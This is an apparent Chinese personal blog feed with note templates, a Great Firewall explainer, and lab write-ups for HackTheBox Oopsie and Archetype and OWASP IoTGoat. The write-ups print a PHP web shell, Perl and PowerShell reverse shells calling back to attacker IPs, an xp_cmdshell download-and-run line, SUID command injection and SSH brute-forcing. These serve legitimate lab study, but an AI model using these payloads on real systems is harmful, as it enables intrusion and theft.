href="#日记模板" class="headerlink" title="日记模板"></a>日记模板</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean">##  Todo<br><br>- [ ] 阅读RSS<br>- [ ] <br><br>## Journal<br><br>- 时间 写几句已经做了的。写几句有关将要做的。<br><br><br>## Tracking<br>- [ ] <br><br>### ReadList<br><br>- [ ] Link<br><br>## Daily quote and Pic<br><br>&#123;&#123;tp_daily_quote&#125;&#125;<br><br>&#123;&#123;tp_random_picture&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="笔记模板"><a href="#笔记模板" class="headerlink" title="笔记模板"></a>笔记模板</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Category:</span> <br><span class="hljs-attr">tag:</span> <br><span class="hljs-attr">related:</span> <br><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><hr><p>2021/2/6更新</p><p>以前用snipaste，直接截屏然后粘贴进typora/obsidian会有图片名字存在空格的情况，如 <code>Pasted image 20210117141035.png</code>这个在我这个版本的hexo(4.2.0)会无法解析图片，也就不能自动转成对应的html代码。</p><p>方法：<strong>snipaste右键-控制-全局快捷键</strong> 里，<strong>截屏并自动复制</strong> 快捷键改为F1即可，这样直接粘贴文件名格式就是<code>image-2021xxxxxxx.png</code>了，这种方法也比在 <strong>输出-文件</strong> 开启自动保存要好0.0</p><p>obsidian暂时还是只能手动保存来实现图片文件改名了。。。。已发邮件请作者加功能，等有空再找找截图工具吧。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>你访问谷歌时，都发生了啥</title>
    <link href="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/"/>
    <url>/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>此文章针对学校萌新，如有错误还请指教。仅出于教育科普意义，不是为了指引。遵守网络安全法，守法青年，从我做起。</p><hr><p>当你访问谷歌的时候，你是否想过为什么会无法打开谷歌？你也可能听说过GFW 防火墙，下面就来探索一番叭。</p><h2 id="什么是防火墙"><a href="#什么是防火墙" class="headerlink" title="什么是防火墙"></a>什么是防火墙</h2><p>可以当作一个在网络出入口，负责过滤所有数据包、网络请求的电脑。里面要访问外面的网站都要经过这里，同理，外面访问里面的网站等也要经过这里。看到这里，聪明的小伙伴应该就猜到了，我们访问谷歌等，基本就是过不去这个坎儿。</p><h2 id="什么法子，拦住了我们"><a href="#什么法子，拦住了我们" class="headerlink" title="什么法子，拦住了我们"></a>什么法子，拦住了我们</h2><p>ping谷歌</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-06-08.png" class=""><p>可以看到，多次ping之后返回了不同的ip，但这两个都不在 <a href="https://www.gstatic.com/ipranges/goog.json">谷歌公布的ip范围</a>内。那么，最起码的，<strong>DNS劫持</strong>是有的了。（<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/2251573?fromtitle=DNS&fromid=427444&fr=aladdin">DNS是什么请点我</a>）他返回一个错误的ip地址给你，即如上所见一样。</p><p>我们在 <a href="https://myssl.com/dns_check.html">在线dns工具</a>查询可得如图结果</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-22-50.png" class=""><p>并经我这测试，选择的ip是可以直接访问打开Google.com的。那么看看网络访问情况如何叭</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-24-12.png" class=""><p>可以看到，直接ping也是不通的。那使用<code>tracert</code>来跟踪路由（<a href="https://baike.baidu.com/item/TRACERT%E5%91%BD%E4%BB%A4/7680170?fr=aladdin">TRACERT命令_百度百科 (baidu.com)</a>）。可以看到跳着跳着，就直接超时了。那么也可以猜到，GFW对于这个ip，是封禁掉了。一看到目的ip是这个，就直接将数据包丢弃了，对于我们这里也就超时了。那么，<strong>IP封禁</strong>，也是有了。</p><p>还有个网传的内容审查，我就不测试了，本质是查询数据包内容，有封禁关键字则把你的链接断掉。这在http时可行，因为基本都是明文的。但是到了https，我个人感觉是不可行了。<a href="https://www.svlik.com/1804.html#:~:text=GFW%EF%BC%8C%E5%8D%B3Great%20Wall%20of,%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E5%9B%BD%E5%86%85%E7%9A%84%E7%AB%99%E7%82%B9%E3%80%82">详细可看这里</a></p><h2 id="我们能怎么过去"><a href="#我们能怎么过去" class="headerlink" title="我们能怎么过去"></a>我们能怎么过去</h2><p>既然针对了ip和dns进行了，那我们的办法即为如何绕过。这就像你在学校里面，学校针对 王者的服务器的ip和dns进行了封禁。为了能继续玩游戏，就有人开动脑筋：我在学校没有封禁的公网服务器上做一个跳板，从这里走，就绕开了学校的封禁了$^1$。又有人，对我们的数据包进行加密，让学校的防火墙打开数据包，横竖都看不出你是发给王者服务器的，那自然也放行了$^2$。还有一种是，肉身出国（误</p><p>基本上，你去找人家，说你要绕过防火墙来玩王者，别人就会秒懂，啪的一下给你一大堆链接，再给你一个订阅链接。</p><p>这里介绍一个软件，clash <a href="https://github.com/Fndroid/clash_for_windows_pkg">clash_for_windows_pkg: A Windows/macOS GUI based on Clash</a> 只要你的上家给你的链接包括了分流规则（也就是，正常的正常走，不正常的跳着走，从跳板走），这里就会自动的帮你分流流量。</p><p>先</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-45-54.png" class=""><p>URL这里粘贴进去你的链接，然后点download，下载好后点一下下方的框框。</p><p>接下来</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-47-52.png" class=""><p>System Proxy勾上即可，这样windows大部分的流量都会走clash出去了。</p><h2 id="最后的叮嘱"><a href="#最后的叮嘱" class="headerlink" title="最后的叮嘱"></a>最后的叮嘱</h2><p>网络不是法外之地。切忌发些反动的东西，不要以为匿名就找不到你，更何况基本没有完全的匿名。网络上总会留有你的蛛丝马迹的。谨言慎行，做守法青年。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>iot信息整理</title>
    <link href="/2020/12/30/iot%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/"/>
    <url>/2020/12/30/iot%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新，欢迎贡献！目前私信QQ，麻烦了！</p><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p><a href="https://zybuluo.com/H4l0/note/1524758">必看-IOT 安全实战资料收集整合</a></p><p><a href="https://zybuluo.com/H4l0/note/1524758#%E6%96%B0%E6%89%8B%E5%90%91%E6%80%BB%E7%BB%93%E6%80%A7%E8%B5%84%E6%96%99">优先看-IOT 安全实战资料收集整合#总结性资料</a></p><p><a href="https://github.com/V33RU/IoTSecurity101#5-firmware-pentesting-os-of-iot-devices">IoT Pentesting 101 &amp;&amp; IoT Security 101</a></p><h2 id="pwnable-靶场"><a href="#pwnable-靶场" class="headerlink" title="pwnable/靶场"></a>pwnable/靶场</h2><p><a href="www.microcorruption.com">microcorruption</a> 教导详细，感觉更像是打游戏！</p><p><a href="https://github.com/firmianay/IoT-vulhub">IoT-vulhub</a> 建好的docker环境，可直接进行复现</p><p><a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html">DVAR - Damn Vulnerable ARM Router | The Exploit Laboratory</a>  给好vm环境，启动即可开始玩耍。但是我挣不出来，拿别人的exp也弄不出来，搞了好几天QwQ                                                </p><p><a href="https://github.com/OWASP/IoTGoat">OWASP IoTGoat</a></p><h2 id="文章-信息收集"><a href="#文章-信息收集" class="headerlink" title="文章/信息收集"></a>文章/信息收集</h2><p><a href="https://delikely.github.io/2099/01/01/IOT-%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86/">IOT 漏洞收集</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Oopsie .28</title>
    <link href="/2020/12/04/HackTheBox%20Starting%20Point%20Oopsie%20.28/"/>
    <url>/2020/12/04/HackTheBox%20Starting%20Point%20Oopsie%20.28/</url>
    
    <content type="html"><![CDATA[<p>扫描结果</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs inform7">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 06:15 EST<br>Nmap scan report for 10.10.10.28<br>Host <span class="hljs-keyword">is</span> up (0.49s latency).<br><br>PORT     STATE  SERVICE          VERSION<br>21/tcp   <span class="hljs-keyword">closed</span> ftp<br>23/tcp   <span class="hljs-keyword">closed</span> telnet<br>53/tcp   <span class="hljs-keyword">closed</span> domain<br>80/tcp   <span class="hljs-keyword">open</span>   http             Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                                                            <br>|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                               <br>|_http-title: Welcome                                                                                                                                                                                                                      <br>110/tcp  <span class="hljs-keyword">closed</span> pop3                                                                                                                                                                                                                       <br>111/tcp  <span class="hljs-keyword">closed</span> rpcbind                                                                                                                                                                                                                    <br>113/tcp  <span class="hljs-keyword">closed</span> ident                                                                                                                                                                                                                      <br>135/tcp  <span class="hljs-keyword">closed</span> msrpc<br>139/tcp  <span class="hljs-keyword">closed</span> netbios-ssn<br>143/tcp  <span class="hljs-keyword">closed</span> imap<br>256/tcp  <span class="hljs-keyword">closed</span> fw1-secureremote<br>445/tcp  <span class="hljs-keyword">closed</span> microsoft-ds<br>587/tcp  <span class="hljs-keyword">closed</span> submission<br>993/tcp  <span class="hljs-keyword">closed</span> imaps<br>995/tcp  <span class="hljs-keyword">closed</span> pop3s<br>1723/tcp <span class="hljs-keyword">closed</span> pptp<br>3306/tcp <span class="hljs-keyword">closed</span> mysql<br>3389/tcp <span class="hljs-keyword">closed</span> ms-wbt-server<br>5900/tcp <span class="hljs-keyword">closed</span> vnc<br>8080/tcp <span class="hljs-keyword">closed</span> http-proxy<br>8888/tcp <span class="hljs-keyword">closed</span> sun-answerbook<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 33.00 seconds<br><br></code></pre></td></tr></table></figure><p>打开对应80端口 <a href="http://10.10.10.28/#">http://10.10.10.28/#</a></p><p>看了看没有啥，扫描路径走起</p><p>扫出来一个登录 <a href="http://10.10.10.28/cdn-cgi/login/i">http://10.10.10.28/cdn-cgi/login/i</a></p><p>密码用的是前面window机器获取的！！！wdnmd</p><p>进去之后，Account页面</p><p><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code></p><p>这个id = 1，爆破一下之后，爆出来30的时候查询到了super admin的id和账户</p><p>而在upload界面，就需要super admin的cookie才能访问到上传</p><p>使用dirsearch工具可以找到<code>/uploads/</code>。 上传的php就保存到了这里</p><p>这里我使用php一句话反弹shell连上就断，使用perl就可以正常连接。</p><p>test.php<br><code>&lt;?php echo shell_exec($_GET[&#39;shell&#39;]);?&gt;</code></p><p>访问link<br><code>http://10.10.10.28/uploads/test.php?shell=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%2210.10.14.214:4444%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27</code></p><p>对应perl命令<code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></p><p>可看<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl">swisskyrepo/PayloadsAllTheThings</a></p><p>连进去之后需要提权</p><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">SHELL=<span class="hljs-regexp">/bin/</span>bash script -q <span class="hljs-regexp">/dev/</span>null<span class="hljs-regexp">//</span>见注解<span class="hljs-number">1</span><br>&gt;Ctrl-Z<span class="hljs-regexp">//</span>见注解<span class="hljs-number">2</span><br>&gt;stty raw -echo<span class="hljs-regexp">//</span>见注解<span class="hljs-number">3</span><br>&gt;fg<span class="hljs-regexp">//</span>见注解<span class="hljs-number">4</span><br>&gt;reset<span class="hljs-regexp">//</span>见注解<span class="hljs-number">5</span><br>&gt;xterm<span class="hljs-regexp">//</span>见注解<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><ol><li>将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</li><li>将netcat暂挂至后台</li><li>将本地终端置于原始模式，以免干扰远程终端</li><li>将netcat返回到前台，注意：这里不会显示输入的命令</li><li>重置远程终端，经测试也可以不进行此操作</li><li>运行xterm<br>来源 <a href="https://blog.csdn.net/m0_48066270/article/details/108641892">渗透测试练习靶场hackthebox——Starting Point Oopsie攻略_TF0xn的博客-CSDN博客</a></li></ol></blockquote><p>在目录之间找了找之后，在<code>cdn-cgi/login</code>找到个<code>db.php</code>，里边有个账户密码，su 切换过去就有了用户权限。</p><p><code>ls -lh $(find / -perm -u=s -type f 2&gt;/dev/null)</code>查看有SUID权限 的可执行文件</p><p>使用<code>cat /etc/group</code>查看bugtracker用户组</p><p>发现可以运行就直接<code>/usr/bin/bugtracker</code>执行了，发现看起来是个cat的代码执行，尝试<code>;</code>命令注入成功，获取了root权限</p><p><code>ls -lRa /root</code>查找root路径下有什么</p><blockquote><p>-R, –recursive            list subdirectories recursively</p></blockquote><blockquote><p>Inside root’s folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Archetype .27</title>
    <link href="/2020/12/03/HackTheBox%20Starting%20Point%20Archetype%20.27/"/>
    <url>/2020/12/03/HackTheBox%20Starting%20Point%20Archetype%20.27/</url>
    
    <content type="html"><![CDATA[<h2 id="VPN-连接"><a href="#VPN-连接" class="headerlink" title="VPN 连接"></a>VPN 连接</h2><p><code>sudo openvpn example.ovpn</code></p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>Sql server相关，这部分总提示我connection reset by peer 无法实验</p><p>链接到sql server</p><p>impacket/examples/<code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code> 判断自己有没有sysadmin（最高级别）的权限。有的话会允许启动<code>xp_cmdshell</code>远程执行代码。启用方法</p><figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>;<br>reconfigure;<br>sp_configure;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><br>reconfigure;<br>xp_cmdshell &quot;whoami&quot; <br></code></pre></td></tr></table></figure><p>通过powershell反弹shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.3&quot;</span>,<span class="hljs-number">443</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>然后通过python起一个mini web服务来托管文件</p><p><code>python3 -m http.server 80</code></p><p>在通过netcat监听本机443端口之后，设置<code>ufw</code>允许访问本机端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">443</span><br><span class="hljs-attribute">ufw</span> <span class="hljs-literal">allow</span> from <span class="hljs-number">10.10.10.27</span> proto tcp to any port <span class="hljs-number">80</span>,<span class="hljs-number">443</span> <br></code></pre></td></tr></table></figure><p>然后远程执行脚本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.3/shell.ps1\&quot;);&quot; <br></code></pre></td></tr></table></figure><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>检查最近通过powershell输入的命令<br><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p><p>查看到有输入的指令<br>![](HackTheBox Starting Point Archetype .27/Pasted%20image%2020201203151558.png)</p><p>backups这个磁盘是通过管理员凭证映射的。可以通过Impackets的<code>psexec.py</code>来获得管理员权限</p><p><code>psexec.py administraotr@10.10.10.27</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IoTGoat</title>
    <link href="/2020/11/03/IoTGoat/"/>
    <url>/2020/11/03/IoTGoat/</url>
    
    <content type="html"><![CDATA[<h2 id="No-1-Weak-Guessable-or-Hardcoded-Passwords"><a href="#No-1-Weak-Guessable-or-Hardcoded-Passwords" class="headerlink" title="No 1: Weak, Guessable, or Hardcoded Passwords:"></a>No 1: Weak, Guessable, or Hardcoded Passwords:</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> . -name cgi-bin<br>.<span class="hljs-regexp">/www/</span>cgi-bin<br></code></pre></td></tr></table></figure><p>查找，<a href="https://github.com/craigz28/firmwalker">firmwalker</a></p><blockquote><p>It will search through the extracted or mounted firmware file system for things of interest such as:</p><ul><li>etc/shadow and etc/passwd</li><li>list out the etc/ssl directory</li><li>search for SSL related files such as .pem, .crt, etc.</li><li>search for configuration files</li><li>look for script files</li><li>search for other .bin files</li><li>look for keywords such as admin, password, remote, etc.</li><li>search for common web servers used on IoT devices</li><li>search for common binaries such as ssh, tftp, dropbear, etc.</li><li>search for URLs, email addresses and IP addresses</li><li>Experimental support for making calls to the Shodan API using the Shodan CLI</li></ul></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/firmwalker.sh ../</span>firmware<span class="hljs-regexp">/_IoTGoat-x86.img.extracted/</span>squashfs-root<span class="hljs-regexp">/ ./</span>IoTGoat.txt<br></code></pre></td></tr></table></figure><blockquote><p><strong>/etc/shadow</strong><br>保存了加密的真实密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">root:$1$Jl7H1VOG<span class="hljs-variable">$Wgw2F</span>/C.nLNTC.4pwDa4H1:</span><br><span class="hljs-meta">&gt;</span><span class="bash">|                |</span><br><span class="hljs-meta">&gt;</span><span class="bash">1                2</span><br></code></pre></td></tr></table></figure><ol><li><p><strong>Username</strong> : It is your login name.</p></li><li><p><strong>Password</strong>: It is your encrypted password. The password should be minimum 8-12 characters long including special characters, digits, lower case alphabetic and more. Usually password format is set to</p><p><code>$id$salt$hashed</code>, The<code>$id</code>is the algorithm used On GNU/Linux as follows:</p><ol><li><code>$1$</code> is MD5</li><li><code>$2a$</code> is Blowfish</li><li><code>$2y$</code>is Blowfish</li><li><code>$5$</code> is SHA-256</li><li><code>$6$</code>is SHA-512</li></ol><p><a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">more</a></p></li></ol></blockquote><p>爆破密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ john --show .<span class="hljs-regexp">/etc/</span>shadow<br><span class="hljs-number">0</span> password hashes cracked, <span class="hljs-number">2</span> left<br></code></pre></td></tr></table></figure><p>hashcat也可以解密md5等，很强大但是我不大会用。。</p><p>medusa</p><blockquote><p>Hydra, Medusa, or Ncrack都可以用来爆破</p></blockquote><p>加上使用<a href="https://github.com/danielmiessler/SecLists">SecList</a></p><blockquote><p>SecLists is the security tester’s companion. It’s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. </p></blockquote><p>使用命令<code>awk &#39;&#123;print $2&#125;&#39; SecLists/Passwords/Malware/mirai-botnet.txt &gt; SecLists/Passwords/Malware/mirai-botnet_passwords.txt</code>来把密码部分导出到一个文件里</p><p>然后</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ medusa -u iotgoatuser -P .<span class="hljs-regexp">/SecLists/</span>Passwords<span class="hljs-regexp">/Malware/mi</span>rai-botnet_passwords.txt -h <span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span> -M ssh<br></code></pre></td></tr></table></figure><p>即可爆破到ssh的密码<code>7ujMko0vizxv</code></p><h2 id="No-2-Insecure-Network-Services"><a href="#No-2-Insecure-Network-Services" class="headerlink" title="No 2: Insecure Network Services:"></a>No 2: Insecure Network Services:</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">kali@kali:~/Desktop/IoTGoat$ nmap -p20-6000 192.168.56.101<br>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 02:45 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.101 (192.168.56.101)<br>Host is up (0.0026s latency).<br>Not shown: 5973 filtered ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>25/tcp   open  smtp<br>53/tcp   open  domain                <br>80/tcp   open  http                                       110/tcp  open  pop3<br>443/tcp  open  https                                       5000/tcp open  upnp                                       5515/tcp open  unknown<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ali</span>@kali:~/Desktop/IoTGoat$ sudo nmap -sU -p<span class="hljs-number">20</span>-<span class="hljs-number">6000</span> <span class="hljs-number">192.168.56.101</span> &gt; ScanUdpResult.txt                         kali@kali:~/Desktop/IoTGoat$ cat ScanUdpResult.txt <br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">80</span> ( https://nmap.org ) at <span class="hljs-number">2020</span>-<span class="hljs-number">11</span>-<span class="hljs-number">09</span> <span class="hljs-number">03</span>:<span class="hljs-number">20</span> EST                                                 Nmap scan report for <span class="hljs-number">192.168.56.101</span> (<span class="hljs-number">192.168.56.101</span>)       Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">00058</span>s latency).                             Not shown: <span class="hljs-number">5980</span> open|filtered ports                      PORT   STATE SERVICE                                       <span class="hljs-number">53</span>/udp open  domain                                       Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16</span>.<span class="hljs-number">01</span> seconds  <br></code></pre></td></tr></table></figure><p>但是我的upnp好像不起作用，只能贴wp了</p><blockquote><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">nmap -p5000 -sV 172.16.100.213<br>Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:10 EDT<br>Nmap scan report for IoTGoat (172.16.100.213)<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE VERSION<br>5000/tcp open  upnp    MiniUPnP 2.1 (UPnP 1.1)<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5000-TCP:V=7.80<span class="hljs-variable">%I=7%</span>D=5/4<span class="hljs-variable">%Time=5EB0D91A%</span>P=x86_64-pc-linux-gnu<span 